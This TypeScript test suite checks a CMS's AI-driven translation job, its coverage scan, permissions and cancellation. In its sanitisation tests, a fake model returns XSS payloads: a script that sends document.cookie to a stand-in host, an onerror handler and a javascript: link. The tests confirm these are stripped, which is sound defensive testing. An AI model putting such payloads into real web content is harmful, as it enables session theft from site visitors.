import assert from 'node:assert/strict'
import test, { after, afterEach, before, beforeEach, mock } from 'node:test'

/**
 * The "Dịch toàn cục" tab (`UniversalTab.vue`): the coverage scan and the background
 * job of `server/services/universal-translation.ts`, through its four routes —
 *   GET  /api/admin/system/translation-coverage     (settings.read)
 *   GET  /api/admin/system/universal-translate-status (settings.read)
 *   POST /api/admin/system/universal-translate      (settings.update)
 *   POST /api/admin/system/universal-translate-cancel (settings.update)
 *
 * The invariants:
 *   - the scan counts the work the job does: published articles without a translation,
 *     vi UI keys without a translation, blocks with something to translate and no
 *     override — translations of drafts or of keys vi does not have are not progress
 *     (FINDING-R6-1), and the scan and the job agree on which block has something to
 *     translate (FINDING-R6-2);
 *   - the job translates missing UI keys in chunks of ten, blocks field by field with
 *     the body HTML apart, and hands each missing published article to the article
 *     worker; the HTML the model writes into a block override is sanitised before it
 *     is stored (FINDING-R6-3); only the fields asked for, as text, reach the override
 *     (FINDING-R6-4); a block is marked translated only when every part asked for came
 *     back (FINDING-R6-5);
 *   - only active languages other than vi are targets (FINDING-R6-6); the article limit
 *     is a whole number ≥ 0, 0 meaning every published article (FINDING-R6-7);
 *   - one run at a time (409), cancel stops at the next item, a failure is reported in
 *     the task state.
 *
 * Real h3 app + `admin-auth`, SQL on SQLite, the real `callAi` down to a fake socket
 * (`_ai-route-harness.ts`). The article worker is replaced by a recorder: it retries
 * with 1.5–6 s pauses and has its own suite (`article-translation-worker-behavior`).
 */

const workerCalls: Array<[number, string, string, string]> = []
mock.module('../server/services/article-translations', {
  namedExports: {
    runTranslationWorker: async (articleId: number, langCode: string, langName: string, targetStatus: string) => {
      workerCalls.push([articleId, langCode, langName, targetStatus])
    },
  },
})

const { startAiRouteHarness, openAiReply } = await import('./_ai-route-harness')
type Sent = import('./_ai-route-harness').Sent
type Reply = import('./_ai-route-harness').Reply
const h = await startAiRouteHarness({
  extraTables: s => [s.languages, s.langTranslations, s.pageBlocks, s.articles, s.articleTranslations, s.activityLogs],
  routes: async load => [
    { method: 'get', path: '/api/admin/system/translation-coverage', handler: await load('../server/api/admin/system/translation-coverage.get') },
    { method: 'get', path: '/api/admin/system/universal-translate-status', handler: await load('../server/api/admin/system/universal-translate-status.get') },
    { method: 'post', path: '/api/admin/system/universal-translate', handler: await load('../server/api/admin/system/universal-translate.post') },
    { method: 'post', path: '/api/admin/system/universal-translate-cancel', handler: await load('../server/api/admin/system/universal-translate-cancel.post') },
  ],
})
after(() => h.server.close())
const svc = await import('../server/services/universal-translation')
const { languages, langTranslations, pageBlocks, articles, articleTranslations, activityLogs } = h.schema

type Json = Record<string, unknown>
type Account = Awaited<ReturnType<typeof h.account>>
let editor: Account
let viewer: Account

// ─── The model ───────────────────────────────────────────────────────────────

const promptOf = (sent: Sent) => (JSON.parse(sent.body) as { messages: Array<{ role: string, content: string }> }).messages.find(m => m.role === 'user')!.content
const kindOf = (prompt: string) =>
  prompt.startsWith('Translate software UI strings') ? 'ui'
    : prompt.includes('Translate the following UI/CMS texts') ? 'fields'
      : prompt.includes('Translate the following HTML content') ? 'html' : 'other'
const reply = (content: string): Reply => ({ status: 200, headers: { 'content-type': 'application/json' }, body: openAiReply(content) })

/** What a well-behaved model answers: every asked item, prefixed with the language it was asked for. */
function goodAnswer(prompt: string): string {
  const kind = kindOf(prompt)
  if (kind === 'ui') {
    const lang = /strings to (.+?)\. Return/.exec(prompt)![1]
    const lines = [...prompt.matchAll(/^\[(\d+)\] key="([^"]*)" group="([^"]*)" text="([^"]*)"$/gm)]
    return JSON.stringify(lines.map(([, i, key, , text]) => ({ i: Number(i), key, value: `${lang}: ${text}` })))
  }
  if (kind === 'fields') {
    const lang = /Vietnamese into (.+?)\.\n/.exec(prompt)![1]
    const fields = JSON.parse(prompt.slice(prompt.lastIndexOf('\n') + 1)) as Record<string, string>
    return JSON.stringify(Object.fromEntries(Object.entries(fields).map(([key, value]) => [key, `${lang}: ${value}`])))
  }
  if (kind === 'html') {
    const lang = /Vietnamese into (.+?)\.\n/.exec(prompt)![1]
    return `<p>${lang}: body</p>`
  }
  return 'ok'
}
type Answers = { ui?: (p: string) => string, fields?: (p: string) => string, html?: (p: string) => string }
function model(overrides: Answers = {}) {
  h.network.reply = (sent) => {
    const prompt = promptOf(sent)
    const own = overrides[kindOf(prompt) as keyof Answers]
    return reply(own ? own(prompt) : goodAnswer(prompt))
  }
}
const asked = (kind: string) => h.network.sent.map(promptOf).filter(prompt => kindOf(prompt) === kind)

// ─── Fixtures ────────────────────────────────────────────────────────────────

async function seedLanguages() {
  await h.harness.db.insert(languages).values([
    { code: 'vi', name: 'Vietnamese', nativeName: 'Tiếng Việt', isActive: true, isDefault: true, displayOrder: 0 },
    { code: 'zh', name: 'Chinese', nativeName: '中文', isActive: true, displayOrder: 2 },
    { code: 'en', name: 'English', nativeName: 'English', isActive: true, displayOrder: 1 },
    { code: 'fr', name: 'French', nativeName: 'Français', isActive: false, displayOrder: 3 },
  ])
}
const ui = (langCode: string, key: string, value: string | null, group = 'common') => ({ langCode, group, key, value })
let slugSeq = 0
async function article(status: string, title = `Bài ${status}`) {
  slugSeq += 1
  const [row] = await h.harness.db.insert(articles).values({ type: 'news', title, slug: `bai-${slugSeq}`, status })
  return Number(row.insertId)
}
async function block(data: Json, isVisible = true, blockType = 'hero') {
  const [row] = await h.harness.db.insert(pageBlocks).values({ pageId: 1, blockType, data, isVisible })
  return Number(row.insertId)
}
const blockData = (id: number) => h.harness.rows(pageBlocks).find(row => row.id === id)!.data as Json
const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))

async function coverage(who: Account = viewer) {
  const response = await h.request('GET', '/api/admin/system/translation-coverage', who)
  assert.equal(response.status, 200, JSON.stringify(response.body))
  return (response.body as { stats: { totalArticles: number, totalBlocks: number, totalUiKeys: number, languages: Json[] } }).stats
}
const start = (body: unknown, who: Account = editor) => h.request('POST', '/api/admin/system/universal-translate', who, body)

/** Start a run and wait for it to end (the job runs on a `setTimeout(0)` after the response). */
async function run(body: Json) {
  const response = await start(body)
  assert.equal(response.status, 200, JSON.stringify(response.body))
  for (let i = 0; i < 1000; i += 1) {
    const state = svc.getUniversalTaskState()
    if (!state.active) return state
    await sleep(5)
  }
  throw new Error('the universal job did not finish')
}
const ONLY = { includeUi: false, includeBlocks: false, includeArticles: false }

before(async () => {
  // One service config for the whole suite: the gateway caches it for 60 s per key.
  h.reset()
  await h.seedAiService({ serviceKey: ['translation_ui', 'translation_article'] })
})
beforeEach(async () => {
  // Rows of the AI service stay; everything this suite writes is cleared.
  for (const table of ['languages', 'lang_translations', 'page_blocks', 'articles', 'article_translations', 'activity_logs', 'ai_usage_logs', 'users', 'roles', 'permissions']) {
    h.harness.sqlite.exec(`DELETE FROM \`${table}\``)
  }
  h.network.sent.length = 0
  h.logged.length = 0
  workerCalls.length = 0
  model()
  await seedLanguages()
  editor = await h.account([{ resource: 'settings', canRead: true, canUpdate: true }], 'caidat')
  viewer = await h.account([{ resource: 'settings', canRead: true }], 'xem')
})
// A run a failed assertion left behind must not answer the next test with a 409.
afterEach(() => waitIdle())

// ─── Permissions ─────────────────────────────────────────────────────────────

test('settings.read sees the scan and the task; starting and cancelling need settings.update; another resource sees nothing', async () => {
  const outsider = await h.account([{ resource: 'news', canRead: true, canUpdate: true }], 'tintuc')
  const routes: Array<[string, string]> = [
    ['GET', '/api/admin/system/translation-coverage'], ['GET', '/api/admin/system/universal-translate-status'],
    ['POST', '/api/admin/system/universal-translate'], ['POST', '/api/admin/system/universal-translate-cancel'],
  ]
  for (const [method, path] of routes) {
    assert.equal((await h.request(method, path, null, method === 'POST' ? { targetLangs: ['en'] } : undefined)).status, 401, path)
    assert.equal((await h.request(method, path, outsider, method === 'POST' ? { targetLangs: ['en'] } : undefined)).status, 403, path)
  }
  assert.equal((await h.request('GET', '/api/admin/system/translation-coverage', viewer)).status, 200)
  assert.equal((await h.request('GET', '/api/admin/system/universal-translate-status', viewer)).status, 200)
  assert.equal((await start({ targetLangs: ['en'] }, viewer)).status, 403)
  assert.equal((await h.request('POST', '/api/admin/system/universal-translate-cancel', viewer)).status, 403)
  assert.equal(svc.getUniversalTaskState().active, false)
  assert.deepEqual(h.network.sent, [])
})

// ─── The coverage scan ───────────────────────────────────────────────────────

test('the scan: active languages other than vi in display order, each with what is missing of the three pillars', async () => {
  await h.harness.db.insert(langTranslations).values([
    ui('vi', 'save', 'Lưu'), ui('vi', 'cancel', 'Huỷ'), ui('vi', 'next', 'Tiếp'), ui('vi', 'back', 'Quay lại'),
    ui('en', 'save', 'Save'), ui('en', 'cancel', '   '), ui('en', 'next', null),
    ui('zh', 'save', '保存'), ui('zh', 'cancel', '取消'), ui('zh', 'next', '下一个'), ui('zh', 'back', '返回'),
  ])
  const translatedId = await block({ title: 'Giới thiệu', translations: { en: { title: 'About' } } })
  await block({ bodyHtml: '<p>Nội dung</p>' })
  await block({ title: 'Ẩn' }, false)
  const a1 = await article('published')
  await article('published')
  await h.harness.db.insert(articleTranslations).values([
    { articleId: a1, langCode: 'en', status: 'ai_draft' },
    { articleId: a1, langCode: 'zh', status: 'failed' },
  ])

  const stats = await coverage()
  assert.deepEqual([stats.totalUiKeys, stats.totalBlocks, stats.totalArticles], [4, 2, 2])
  assert.deepEqual(stats.languages.map(lang => [lang.code, lang.uiMissing, lang.blocksMissing, lang.articlesMissing, lang.totalMissing, lang.percent]), [
    // en: 3 UI keys (blank and NULL count as missing), the body block, one article — 3 + 1 + 1 of 8.
    ['en', 3, 1, 1, 5, 38],
    // zh: a failed translation is not one.
    ['zh', 0, 2, 2, 4, 50],
  ])
  assert.ok(translatedId > 0)
})

test('FINDING-R6-1: translations of a draft, and target keys vi does not have, are not progress on the published work', async () => {
  // Two published articles, neither translated; two drafts translated into English.
  await article('published')
  await article('published')
  for (const id of [await article('draft'), await article('archived')]) {
    await h.harness.db.insert(articleTranslations).values({ articleId: id, langCode: 'en', status: 'published' })
  }
  // Two vi keys, neither translated; English has two keys of its own (a deleted category's).
  await h.harness.db.insert(langTranslations).values([
    ui('vi', 'save', 'Lưu'), ui('vi', 'cancel', 'Huỷ'),
    ui('en', 'cat_old', 'Old category', 'categories'), ui('en', 'cat_old_desc', 'Old', 'categories'),
  ])
  const en = (await coverage()).languages.find(lang => lang.code === 'en')!
  // Before: 0 articles and 0 keys missing, 100 % — while nothing published was translated.
  assert.deepEqual([en.articlesMissing, en.uiMissing, en.percent], [2, 2, 0])
})

test('FINDING-R6-2: the scan counts exactly the blocks the job translates, so a finished run reaches 100 %', async () => {
  // Translated by the job (a button label) but not counted by the old scan:
  const button = await block({ btnText: 'Xem thêm', btnLink: '/news' })
  // Counted by the old scan, never translatable (numbers only; a title that is not text):
  await block({ stats: [{ value: '1.200' }, { value: '35' }] })
  await block({ title: { nested: 'x' } })
  const before = await coverage()
  assert.equal(before.totalBlocks, 1)
  assert.deepEqual(before.languages.map(lang => lang.blocksMissing), [1, 1])

  await run({ targetLangs: ['en', 'zh'], ...ONLY, includeBlocks: true })
  assert.deepEqual((blockData(button).translations as Json).en, { btnText: 'English: Xem thêm' })
  const afterRun = await coverage()
  assert.deepEqual(afterRun.languages.map(lang => [lang.code, lang.blocksMissing, lang.percent]), [['en', 0, 100], ['zh', 0, 100]])
  // Nothing to translate, nothing asked: two languages, one block.
  assert.equal(asked('fields').length, 2)
})

// ─── The job: UI keys ────────────────────────────────────────────────────────

test('UI keys: every vi key without text in the language, ten per call, stored as AI translations with an audit row per chunk', async () => {
  const viKeys = Array.from({ length: 12 }, (_, n) => ui('vi', `k${n}`, `Nhãn ${n}`))
  await h.harness.db.insert(langTranslations).values([...viKeys, ui('en', 'k0', 'Kept'), ui('en', 'k1', '')])
  const state = await run({ targetLangs: ['en'], ...ONLY, includeUi: true })

  assert.equal(asked('ui').length, 2, '11 missing keys → 2 chunks')
  assert.ok(asked('ui').every(prompt => prompt.startsWith('Translate software UI strings to English.')))
  const en = h.harness.rows(langTranslations).filter(row => row.langCode === 'en')
  assert.equal(en.find(row => row.key === 'k0')!.value, 'Kept', 'a translated key is not asked again')
  assert.deepEqual(en.filter(row => row.key !== 'k0').map(row => [row.key, row.value, row.isAiTranslated]).sort(),
    Array.from({ length: 11 }, (_, n) => [`k${n + 1}`, `English: Nhãn ${n + 1}`, true]).sort())
  const audits = h.harness.rows(activityLogs)
  assert.deepEqual(audits.map(row => [row.userId, (row.meta as Json).operation, (row.meta as Json).count]), [[editor.id, 'update_translations', 10], [editor.id, 'update_translations', 1]])
  assert.deepEqual([state.phase, state.percent, state.processedItems, state.totalItems, state.error], ['Hoàn tất', 100, 2, 2, null])
  assert.ok(state.completedAt)
})

// ─── The job: blocks ─────────────────────────────────────────────────────────

test('blocks: the text fields go in one JSON call, the body HTML in its own; the override joins the block, the rest of it untouched', async () => {
  const id = await block({
    title: ' Giới thiệu ', subtitle: '', heading: 'Về chúng tôi', bodyHtml: '<h3>Đề mục</h3><p>Đoạn <strong>đậm</strong></p>',
    image: '/uploads/a.jpg', stats: [{ label: 'Học viên', value: '1.200' }, { value: '3' }],
    infoRows: [{ label: 'Điện thoại', value: '0243 123 456' }, { label: 'Email', value: 'lienhe@c11.gov.vn' }, { label: 'Địa chỉ', value: '47 Phạm Văn Đồng' }],
  })
  const skipped = await block({ title: 'Đã dịch', translations: { en: { title: 'Translated' } } })
  const hidden = await block({ title: 'Ẩn' }, false)
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })

  const fieldsPrompt = asked('fields')
  assert.equal(fieldsPrompt.length, 1, 'only the untranslated visible block')
  assert.deepEqual(JSON.parse(fieldsPrompt[0]!.slice(fieldsPrompt[0]!.lastIndexOf('\n') + 1)), {
    title: 'Giới thiệu', heading: 'Về chúng tôi', __stat_label_0: 'Học viên',
    __inforow_label_0: 'Điện thoại', __inforow_label_1: 'Email', __inforow_label_2: 'Địa chỉ', __inforow_value_2: '47 Phạm Văn Đồng',
  })
  assert.equal(asked('html').length, 1)
  assert.ok(asked('html')[0]!.endsWith('\n\n<h3>Đề mục</h3><p>Đoạn <strong>đậm</strong></p>'))

  const data = blockData(id)
  assert.equal(data.title, ' Giới thiệu ', 'the Vietnamese block is not rewritten')
  assert.deepEqual((data.translations as Json).en, {
    title: 'English: Giới thiệu', heading: 'English: Về chúng tôi', bodyHtml: '<p>English: body</p>',
    stats: [{ label: 'English: Học viên', value: '1.200' }, { value: '3' }],
    infoRows: [
      { label: 'English: Điện thoại', value: '0243 123 456' }, { label: 'English: Email', value: 'lienhe@c11.gov.vn' },
      { label: 'English: Địa chỉ', value: 'English: 47 Phạm Văn Đồng' },
    ],
  })
  assert.deepEqual(blockData(skipped).translations, { en: { title: 'Translated' } })
  assert.equal(blockData(hidden).translations, undefined)
})

test('FINDING-R6-3: the HTML the model writes into a block override is sanitised before it is stored', async () => {
  const id = await block({ bodyHtml: '<p>Nội dung</p>' })
  model({ html: () => '<h3>Title</h3><p>Body <a href="https://c11.gov.vn" target="_blank">link</a></p><script>fetch("//evil.test?c="+document.cookie)</script><img src=x onerror="alert(1)"><a href="javascript:alert(2)">x</a>' })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  const stored = String(((blockData(id).translations as Json).en as Json).bodyHtml)
  assert.doesNotMatch(stored, /<script|onerror|javascript:/i, stored)
  assert.match(stored, /^<h3>Title<\/h3><p>Body <a href="https:\/\/c11\.gov\.vn" target="_blank" rel="noopener noreferrer">link<\/a><\/p>/)
})

test('FINDING-R6-4: only the fields that were asked for, as text, reach the override', async () => {
  const id = await block({ title: 'Tin tức', stats: [{ label: 'Bài viết', value: '120' }] })
  // The model adds a badge the Vietnamese block does not have, a stat line that does
  // not exist, and answers the stat label with an object.
  model({ fields: () => JSON.stringify({ title: 'News', badge: 'HOT', btnText: 'Buy now', __stat_label_0: 'Articles', __stat_label_7: 'Ghost' }) })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual((blockData(id).translations as Json).en, { title: 'News', stats: [{ label: 'Articles', value: '120' }] })

  const other = await block({ title: 'Liên hệ', stats: [{ label: 'Cán bộ', value: '9' }] })
  model({ fields: () => JSON.stringify({ title: 'Contact', __stat_label_0: { text: 'Officers' } }) })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  // "[object Object]" was stored as the label; an answer that is not text is no answer.
  assert.equal((blockData(other).translations as Json | undefined)?.en, undefined)
})

test('FINDING-R6-5: a block is translated only when every part came back — a failed part leaves it for the next run', async () => {
  const id = await block({ title: 'Tiêu đề', bodyHtml: '<p>Thân</p>' })
  model({ fields: () => 'Xin lỗi, tôi không thể trả lời.' })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.equal(asked('fields').length, 2, 'the JSON part is asked twice')
  // Before: the override held the body alone, and both the scan and the next run took
  // the block as translated — its Vietnamese title stayed on the English page for good.
  assert.equal(blockData(id).translations, undefined)
  assert.equal((await coverage()).languages.find(lang => lang.code === 'en')!.blocksMissing, 1)
  assert.ok(h.logged.some(line => line.includes('universal_translate.block_json_parse_failed')))

  // A JSON answer that leaves out a field asked for is not complete either (the first
  // block, asked for its title only, gets a complete answer this time).
  const two = await block({ title: 'Một', subtitle: 'Hai' })
  model({ fields: (prompt) => { const all = JSON.parse(goodAnswer(prompt)) as Json; delete all.subtitle; return JSON.stringify(all) } })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.equal(blockData(two).translations, undefined)

  // The next run, with a model that answers, translates both.
  model()
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual((blockData(id).translations as Json).en, { title: 'English: Tiêu đề', bodyHtml: '<p>English: body</p>' })
  assert.deepEqual((blockData(two).translations as Json).en, { title: 'English: Một', subtitle: 'English: Hai' })
})

// ─── Blocks: the paths the verifier found untested (M2, L4) ──────────────────

test('FINDING-R6-5 (M2): the HTML part failing twice leaves the block untranslated — its text fields are not stored alone', async () => {
  const id = await block({ title: 'Tiêu đề', bodyHtml: '<p>Thân</p>' })
  model({ html: () => '```html\n```' }) // an empty answer once the fence is stripped
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual([asked('fields').length, asked('html').length], [1, 2])
  assert.equal(blockData(id).translations, undefined, 'no override holding the title alone')
  assert.ok(h.logged.some(line => line.includes('universal_translate.block_html_failed')))
})

test('FINDING-R6-3 (M2): the HTML of a second attempt is sanitised like the first', async () => {
  const id = await block({ bodyHtml: '<p>Nội dung</p>' })
  let attempt = 0
  model({ html: () => (attempt++ === 0 ? '' : '<p>Body</p><script>alert(1)</script><img src=x onerror="alert(2)">') })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.equal(attempt, 2)
  assert.equal(((blockData(id).translations as Json).en as Json).bodyHtml, '<p>Body</p><img src="x">')
})

test('blocks: the override joins the block as it is when written — a change saved during the model call is kept', async () => {
  const id = await block({ title: 'Giới thiệu' })
  // Another officer saves a Chinese override and edits the subtitle while the model answers.
  model({
    fields: (prompt) => {
      h.harness.sqlite.prepare('UPDATE page_blocks SET data = ? WHERE id = ?')
        .run(JSON.stringify({ title: 'Giới thiệu', subtitle: 'Mới sửa', translations: { zh: { title: '介绍' } } }), id)
      return goodAnswer(prompt)
    },
  })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual(blockData(id), { title: 'Giới thiệu', subtitle: 'Mới sửa', translations: { zh: { title: '介绍' }, en: { title: 'English: Giới thiệu' } } })
})

test('blocks: a JSON answer with a trailing comma inside prose is still read', async () => {
  const id = await block({ title: 'Tin tức' })
  model({ fields: () => 'Kết quả: {"title": "News",}' })
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual((blockData(id).translations as Json).en, { title: 'News' })
})

test('blocks: an empty override (`translations.en = {}`) is not a translation — counted missing, then translated', async () => {
  const id = await block({ title: 'Liên hệ', translations: { en: {} } })
  assert.deepEqual((await coverage()).languages.map(lang => [lang.code, lang.blocksMissing]), [['en', 1], ['zh', 1]])
  await run({ targetLangs: ['en'], ...ONLY, includeBlocks: true })
  assert.deepEqual((blockData(id).translations as Json).en, { title: 'English: Liên hệ' })
})

// ─── The job: articles ───────────────────────────────────────────────────────

test('articles: each published article without a translation in the language, newest first, up to the limit, to the worker', async () => {
  const a1 = await article('published')
  const a2 = await article('published')
  const a3 = await article('published')
  const a4 = await article('published')
  await article('draft')
  await h.harness.db.insert(articleTranslations).values([
    { articleId: a4, langCode: 'en', status: 'ai_draft' },
    { articleId: a3, langCode: 'en', status: 'failed' },
  ])
  await run({ targetLangs: ['en', 'zh'], ...ONLY, includeArticles: true, articlesLimit: 3 })
  // The limit picks the 3 newest published articles per language, then drops the translated ones.
  const forLang = (code: string) => workerCalls.filter(call => call[1] === code)
  assert.deepEqual(forLang('en'), [[a3, 'en', 'English', 'ai_draft'], [a2, 'en', 'English', 'ai_draft']])
  assert.deepEqual(forLang('zh'), [[a4, 'zh', 'Chinese', 'ai_draft'], [a3, 'zh', 'Chinese', 'ai_draft'], [a2, 'zh', 'Chinese', 'ai_draft']])
  assert.equal(workerCalls.length, 5)
  assert.ok(a1 < a2)

  workerCalls.length = 0
  const state = await run({ targetLangs: ['zh'], ...ONLY, includeArticles: true, articlesLimit: 0, publishImmediately: true })
  // 0 is "every published article"; publishImmediately publishes the translation.
  assert.deepEqual(workerCalls.map(call => [call[0], call[3]]), [[a4, 'published'], [a3, 'published'], [a2, 'published'], [a1, 'published']])
  assert.deepEqual([state.processedItems, state.totalItems, state.percent], [4, 4, 100])
})

test('articles: a request without articlesLimit takes the 20 newest published articles, not the whole archive', async () => {
  const ids: number[] = []
  for (let n = 0; n < 22; n += 1) ids.push(await article('published'))
  await run({ targetLangs: ['en'], ...ONLY, includeArticles: true })
  assert.deepEqual(workerCalls.map(call => call[0]), ids.slice(2).reverse())
})

test('FINDING-R6-6: only active languages other than vi are translated into, whatever the request names', async () => {
  await h.harness.db.insert(langTranslations).values([ui('vi', 'save', 'Lưu'), ui('vi', 'empty', '')])
  await block({ title: 'Giới thiệu' })
  await article('published')
  // vi (the source), fr (switched off), xx (does not exist).
  const state = await run({ targetLangs: ['vi', 'fr', 'xx'] })
  // Before: vi was "translated" into Vietnamese — the block got a `vi` override, the
  // article a `vi` translation — and fr, switched off, was paid for as well.
  assert.deepEqual(h.network.sent, [])
  assert.deepEqual(workerCalls, [])
  assert.equal((h.harness.rows(pageBlocks)[0]!.data as Json).translations, undefined)
  assert.deepEqual(h.harness.rows(articleTranslations), [])
  assert.deepEqual([state.phase, state.error], ['Hoàn tất', null])
})

test('FINDING-R6-7: the article limit is a whole number ≥ 0 — anything else is a 400 before a run starts', async () => {
  await article('published')
  for (const articlesLimit of ['abc', -1, 2.5, '20', null, true]) {
    const response = await start({ targetLangs: ['en'], ...ONLY, includeArticles: true, articlesLimit })
    // Before: NaN and negative numbers became "no limit" — every published article,
    // times every language, each a paid run of the article worker.
    assert.equal(response.status, 400, JSON.stringify(articlesLimit))
    assert.equal(response.body.statusMessage, 'Số bài viết cần dịch phải là số nguyên từ 0 trở lên (0 = tất cả).')
  }
  assert.equal(svc.getUniversalTaskState().active, false)
  await sleep(20)
  assert.deepEqual(workerCalls, [])
})

// ─── One run at a time; cancel; failure ──────────────────────────────────────

/** Hold the provider: the run stops on its first model call until `release()`. */
function holdProvider() {
  let answerHeld!: () => void
  let reached!: () => void
  const atProvider = new Promise<void>((resolve) => { reached = resolve })
  h.network.reply = (sent) => {
    reached()
    return new Promise<Reply>((resolve) => { answerHeld = () => resolve(reply(goodAnswer(promptOf(sent)))) })
  }
  return { atProvider, release: () => { model(); answerHeld() } }
}
const waitIdle = async () => { for (let i = 0; i < 1000 && svc.getUniversalTaskState().active; i += 1) await sleep(5) }

test('a second run while one is going is a 409; the status shows the running task; it ends normally', async () => {
  await h.harness.db.insert(langTranslations).values([ui('vi', 'save', 'Lưu')])
  const held = holdProvider()
  assert.equal((await start({ targetLangs: ['en'], ...ONLY, includeUi: true })).status, 200)
  await held.atProvider
  const second = await start({ targetLangs: ['zh'] })
  assert.deepEqual([second.status, second.body.statusMessage], [409, 'Một tác vụ quét và dịch toàn cục đang chạy.'])
  const status = await h.request('GET', '/api/admin/system/universal-translate-status', viewer)
  const task = status.body.task as Json
  assert.deepEqual([task.active, task.targetLangs, task.phase, task.totalItems], [true, ['en'], 'Dịch các chuỗi giao diện (UI)...', 1])
  held.release()
  await waitIdle()
  assert.equal(svc.getUniversalTaskState().phase, 'Hoàn tất')
})

test('cancel: nothing running → { ok: false }; while running → the run stops before its next item', async () => {
  const idle = await h.request('POST', '/api/admin/system/universal-translate-cancel', editor)
  assert.deepEqual([idle.status, idle.body], [200, { ok: false, message: 'Không có tác vụ nào đang chạy.' }])

  await h.harness.db.insert(langTranslations).values(Array.from({ length: 25 }, (_, n) => ui('vi', `k${n}`, `Nhãn ${n}`)))
  await block({ title: 'Giới thiệu' })
  const held = holdProvider()
  assert.equal((await start({ targetLangs: ['en'] })).status, 200)
  await held.atProvider
  const cancel = await h.request('POST', '/api/admin/system/universal-translate-cancel', editor)
  assert.deepEqual([cancel.status, cancel.body.ok, svc.getUniversalTaskState().phase], [200, true, 'Đang dừng...'])
  held.release()
  await waitIdle()
  const state = svc.getUniversalTaskState()
  assert.deepEqual([state.phase, state.active, state.completedAt], ['Đã dừng', false, null])
  // The chunk in flight finished; no other chunk, block or article was started.
  assert.equal(h.network.sent.length, 1)
  assert.equal(h.harness.rows(langTranslations).filter(row => row.langCode === 'en').length, 10)
  assert.deepEqual(workerCalls, [])
})

test('a failure mid-run is reported in the task state, and the next run starts clean', async () => {
  await h.harness.db.insert(langTranslations).values([ui('vi', 'save', 'Lưu')])
  h.harness.failNext(/from `lang_translations` where `lang_translations`.`lang_code` = \?/)
  const failed = await run({ targetLangs: ['en'], ...ONLY, includeUi: true })
  assert.match(String(failed.error), /^Failed query: select .* from `lang_translations`/)
  assert.deepEqual([failed.active, failed.completedAt], [false, null])
  assert.ok(h.logged.some(line => line.includes('universal_translate.failed')))

  const next = await run({ targetLangs: ['en'], ...ONLY, includeUi: true })
  assert.deepEqual([next.error, next.phase], [null, 'Hoàn tất'])
})
